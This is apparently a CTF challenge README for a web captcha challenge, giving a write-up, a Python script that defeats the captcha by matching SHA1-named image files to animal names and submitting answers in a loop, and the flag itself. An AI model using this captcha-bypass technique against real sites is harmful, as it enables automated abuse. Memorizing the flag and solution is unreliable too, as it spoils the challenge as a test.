#### :warning: Please configure `processes` in Nginx Unit in Dockerfile according to server specs and [documentation](https://unit.nginx.org/configuration/#applications), right now it is not set, and the default value is 1, which is not optimal.


# Challenge Title/Description

captcha2 | the Missing Lake 2

Sorry for bothering you again! We forgot to retrieve some valuable assets the last time.
They have changed their captcha system, I think they know that we know about OCRs :)

# Write Up

First you have to find all animals present in the back-end.
1. Keep refreshing the page to find new animals: keep a table of all of them.
2. If you pay attention, the file-name of the animals is the sha1 of their names(capitalized), you can create a pre-set table.

Rest is easy, automate matching hashes + submitting to form
```python
import requests
from bs4 import BeautifulSoup

url = 'https://captcha2.uctf.ir/'

pictures = {
    'rabbit': '6D0EBBBDCE32474DB8141D23D2C01BD9628D6E5F.jpeg',
    'dog': 'E49512524F47B4138D850C9D9D85972927281DA0.jpeg',
    'cat': '9D989E8D27DC9E0EC3389FC855F142C3D40F0C50.jpeg',
    'bear': '09F5EDEB4F5B2A4E4364F6B654682C6758A3FA16.jpeg',
    'fox': 'FF0F0A8B656F0B44C26933ACD2E367B6C1211290.jpeg',
    'eagle': 'C29E4D9C8824409119EAA8BA182051B89121E663.jpeg',
    'snake': '148627088915C721CCEBB4C611B859031037E6AD.jpeg',
    'horse': '091B5035885C00170FEC9ECF24224933E3DE3FCC.jpeg',
    'penguin': '73335C221018B95C013FF3F074BD9E8550E8D48E.jpeg',
    'mouse': '9E05E6832CAFFCA519722B608570B8FF4935B94D.jpeg',
    'duck': '5ECE240085B9AD85B64896082E3761C54EF581DE.jpeg',
}

session = requests.Session()

def solve_captcha():
    response = session.get(url)
    
    soup = BeautifulSoup(response.text, 'html.parser')
    
    img_tags = soup.find_all('img')
    first_img_src = img_tags[0]['src']
    second_img_src = img_tags[1]['src']
    
    first_pic_title = [key for key, value in pictures.items() if value == first_img_src][0]
    second_pic_title = [key for key, value in pictures.items() if value == second_img_src][0]
    captcha_answer = f"{first_pic_title}-{second_pic_title}"
    
    response = session.post(url, data={'captcha': captcha_answer})
    
for _ in range(110): # Add 10 more just to make sure?
    solve_captcha()

print(session.get(url).text) # Get the flag from this print statement
```

# Flag

UCTF{Arm3n1an_m0uflon}

# Categories

Check the categories which the challenge belongs to.

- [x] Web
- [ ] Reverse
- [ ] PWN
- [ ] Misc
- [ ] Forensics
- [ ] Cryptography
- [ ] Steganography

# Points

| Warm up | This Challenge  | Evil |
| ------- |:---------------:| ----:|
| 25      |       250       | 500  |

# Resources

You should create a folder including all needed files. You may create the challenge using [Docker Compose](https://docs.docker.com/compose/gettingstarted/). Additionally, You may put your files here including *reverse engineering* or *pcap* files.
